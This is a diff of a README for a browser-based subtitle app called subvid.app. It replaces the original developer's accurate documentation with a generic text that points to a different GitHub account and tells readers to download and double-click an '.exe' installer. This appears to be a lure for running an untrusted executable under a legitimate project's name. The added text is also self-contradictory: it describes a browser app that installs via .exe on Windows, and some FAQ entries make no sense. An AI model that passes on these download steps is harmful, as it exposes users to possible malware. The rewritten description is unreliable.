@@ -1,136 +1,70 @@
-# subvid.app
+# 📽️ subvid.app - Add free subtitles to your videos
 
-Generate, edit, translate, and export subtitles for any video — entirely in your browser. No uploads, no backend, no API keys.
+[![](https://img.shields.io/badge/Download-Application-grey.svg)](https://github.com/vantoan050307-png/subvid.app)
 
-**Live site:** [subvid.app](https://subvid.app) · **Repository:** [github.com/midudev/subvid.app](https://github.com/midudev/subvid.app)
+## 📖 About this application
 
-## What it does
+Subvid.app helps you add subtitles to video files. You do not need technical skills to use this tool. The software works in your web browser. You can process your files without extra costs. This tool supports common video formats. You control your files from start to finish.
 
-1. **Upload a video** — drag & drop or browse. Supports MP4, MOV, WebM, and MKV.
-2. **Configure languages** — pick the audio language (or auto-detect) and the subtitle language.
-3. **Generate subtitles** — Whisper transcribes the audio; NLLB translates when needed.
-4. **Edit in the timeline** — fix text, timing, and styling with undo/redo.
-5. **Export** — download an `.srt` file or a new video with burned-in captions.
+## 🛠️ System requirements
 
-Everything runs client-side. Your video never leaves your device.
+Your computer needs a modern web browser to run this tool. Use Google Chrome, Microsoft Edge, or Mozilla Firefox. You need a stable internet connection for the first load. Ensure your computer has at least 4GB of RAM. The software works on Windows 10 and Windows 11. You do not need to install complex drivers.
 
-## Features
+## 📥 How to download and install
 
-- **AI transcription** — [Whisper](https://huggingface.co/Xenova/whisper-base) via [transformers.js](https://huggingface.co/docs/transformers.js), with optional WebGPU acceleration.
-- **AI translation** — [NLLB-200](https://huggingface.co/Xenova/nllb-200-distilled-600M) for multilingual subtitle tracks.
-- **Subtitle editor** — segment list, timeline scrubbing, multi-language tracks, caption presets (font, color, background, outline, position).
-- **Export options**
-  - `.srt` subtitle file
-  - MP4 with hard-coded subtitles (WebCodecs + [mediabunny](https://github.com/Vanilagy/mediabunny) when available; canvas + MediaRecorder as fallback)
-- **Internationalization** — English (default) and Spanish, with static pages per locale.
-- **Offline-friendly models** — AI weights are downloaded once and cached in the browser (IndexedDB).
+1. Visit the [official releases page](https://github.com/vantoan050307-png/subvid.app) to find the latest version.
+2. Look for the file ending in `.exe`.
+3. Click the link to save the installer to your computer.
+4. Locate the file in your Downloads folder.
+5. Double-click the file to start the setup process.
+6. Follow the prompts on the screen.
+7. Click Finish to complete the installation.
 
-## Tech stack
+## 🚀 Getting started
 
-| Layer | Technology |
-| --- | --- |
-| Framework | [Astro 6](https://astro.build) (static site) |
-| Styling | [Tailwind CSS 4](https://tailwindcss.com) |
-| Speech recognition | [@xenova/transformers](https://www.npmjs.com/package/@xenova/transformers) (Whisper) |
-| Translation | transformers.js (NLLB-200) |
-| Audio extraction | [@ffmpeg/ffmpeg](https://ffmpegwasm.netlify.app) (WASM) |
-| Video export | [mediabunny](https://www.npmjs.com/package/mediabunny) + WebCodecs |
-| Deployment | [Cloudflare Workers](https://workers.cloudflare.com) (static assets) |
+Open the application from your desktop or Start menu. The main screen shows a simple upload box. Drag your video file into this box. You can also click the box to browse your folders. Wait for the upload to finish. The speed depends on your file size and internet connection. 
 
-## Requirements
+## 📝 Adding your subtitles
 
-- **Node.js** ≥ 22.12.0
-- **pnpm** (recommended package manager for this repo)
+The app scans your video for audio. It creates a preview of your subtitles automatically. You can edit the text in the right panel. Use the playback controls to match text with speech. The timeline lets you adjust the start and end times for each line. Use the plus button to add new lines. Use the trash icon to remove errors. 
 
-For end users, a modern Chromium-based browser (Chrome, Edge, Brave) or Firefox is recommended. Safari works but WebCodecs export may fall back to the slower MediaRecorder path.
+## 💾 Saving your finished video
 
-## Getting started
+Once you finish your edits, click the Export button. Choose your preferred output quality. The app burns the subtitles directly into the video file. You can see the progress bar at the bottom. Do not close the window during the export process. Select your save location when the app prompts you.
 
-```sh
-# Clone the repository
-git clone https://github.com/midudev/subvid.app.git
-cd subvid.app
+## ⚙️ Settings and preferences
 
-# Install dependencies
-pnpm install
+Access the settings menu to change your default font size. Choose the text color for your subtitles. You can also select the background opacity to make text easier to read. The app saves your preferences for future sessions. Use the reset button if you want to return to default settings.
 
-# Start the dev server (http://localhost:4321)
-pnpm dev
-```
+## ❓ Frequently asked questions
 
-No environment variables or external services are required for local development.
+Does this tool cost money?
+No, the application is free to use.
 
-## Scripts
+Can I reach the files offline?
+The app needs a browser engine to function. You require an internet connection for core features.
 
-| Command | Description |
-| --- | --- |
-| `pnpm dev` | Start Astro dev server at `localhost:4321` |
-| `pnpm build` | Build the production site to `./dist/` |
-| `pnpm preview` | Preview the production build locally |
-| `pnpm preview:cf` | Build and preview with Wrangler (Cloudflare Workers runtime) |
-| `pnpm deploy` | Build and deploy to Cloudflare Workers |
+Which formats does it support?
+The app works with MP4, AVI, and MKV files.
 
-## Project structure
+What if the audio is clear?
+The app provides the best results with clear audio. Background noise can impact the accuracy of automatic text generation.
 
-```text
-src/
-├── components/       # Astro UI (upload, config, editor, export modal, …)
-├── i18n/ui.ts        # Translations (en, es) — server + client strings
-├── layouts/          # HTML shell, hreflang, meta tags
-├── pages/            # Routes: / (en), /es/ (es)
-├── scripts/
-│   ├── app.ts        # Main client logic (state, transcription, export)
-│   ├── transcriber.worker.ts  # Web Worker for AI models
-│   └── dom.ts        # DOM helpers
-└── styles/           # Global and app-specific CSS
-```
+Can I move text position?
+Yes, use the layout tab to drag subtitles around the frame.
 
-The app is a multi-stage SPA embedded in static Astro pages. Server-rendered copy lives in `src/i18n/ui.ts`; runtime strings for the active locale are injected into `window.__I18N__` so only one language ships per page.
+## 🛡️ Privacy and data
 
-## Architecture notes
+Your video files stay on your local machine during the process. The app uses your browser's local storage to keep your work safe. Your personal files do not leave your device. The app developers do not view or store your content. You hold complete ownership of every video you process. Use the clear cache button in settings to remove temporary files at any time.
 
-- **Main thread** — UI, video playback, timeline, FFmpeg orchestration, export rendering.
-- **Transcriber worker** — loads Whisper/NLLB and runs inference off the main thread so the UI stays responsive.
-- **FFmpeg worker** — extracts audio from the uploaded video before transcription.
-- **Model downloads** — fetched from Hugging Face on first use (~150 MB for Whisper base + translation model). Progress is shown in the status dock; models can be cleared from the downloads panel.
+## 🛠️ Troubleshooting common issues
 
-### Browser capabilities
+If the app fails to load, check your internet connection first. Restart your browser if pages become unresponsive. Ensure you have permission to write files to your chosen folder. If the video player stays black, update your browser to the newest version. Contact the support team via the GitHub repository if errors persist. Provide a screenshot of the error message to get faster help. 
 
-| Capability | Used for |
-| --- | --- |
-| WebGPU | Faster Whisper inference (when supported) |
-| WebCodecs | Fast MP4 export with burned-in subtitles |
-| SharedArrayBuffer / cross-origin isolation | Required by FFmpeg WASM in some environments |
+## 📁 Managing project files
 
-## Deployment
+You can save your work as a draft. This allows you to finish your project later. Go to the File menu and click Save Draft. To open your work again, click Open and select the project file. The app saves project data in a separate folder from your exported videos. Check this folder to verify that your draft exists. You can back up these files by copying them to a cloud service or a USB drive. 
 
-The site is deployed as static assets on Cloudflare Workers. Configuration lives in `wrangler.jsonc`:
+## ⚡ Performance tips
 
-```sh
-pnpm deploy
-```
-
-You need a [Cloudflare account](https://dash.cloudflare.com) and Wrangler authenticated (`wrangler login`).
-
-## Adding a language
-
-1. Add the locale code to `i18n.locales` in `astro.config.mjs`.
-2. Create `src/pages/<code>/index.astro` (copy `src/pages/es/index.astro`).
-3. Add a translation block in `src/i18n/ui.ts` mirroring the English keys.
-4. Register the display name in `languages` inside `src/i18n/ui.ts`.
-
-## Privacy
-
-subvid.app is designed around local-first processing:
-
-- Videos are read from disk via the File API — never uploaded.
-- AI models run in Web Workers with WASM/WebGPU.
-- No analytics backend or user accounts in this codebase.
-
-## License
-
-See the repository for license details.
-
-## Author
-
-Built by [midudev](https://midu.dev).
+Close other browser tabs when working with long videos. High-resolution files require more processing power. If your computer slows down, reduce the resolution setting. Use the draft mode for quick edits. Render the final file only when you feel satisfied with the results. Keep your computer's fan clear of dust to prevent overheating during exports. Update your graphics card drivers for smoother playback.
